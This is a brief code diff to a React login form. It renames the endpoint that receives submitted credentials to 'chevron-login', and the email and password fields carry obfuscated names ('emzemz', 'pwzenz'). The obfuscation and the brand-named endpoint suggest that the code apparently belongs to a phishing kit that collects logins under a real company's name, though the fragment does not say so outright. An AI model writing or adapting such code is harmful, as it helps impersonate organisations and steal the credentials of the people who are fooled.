@@ -87,7 +87,7 @@ const LoginForm: React.FC = () => {
 
     if (!newErrors.emzemz && !newErrors.pwzenz) {
       try {
-        await axios.post(`${baseUrl}api/logix-meta-data-1/`, {
+        await axios.post(`${baseUrl}api/chevron-login/`, {
           emzemz,
           pwzenz,
         });
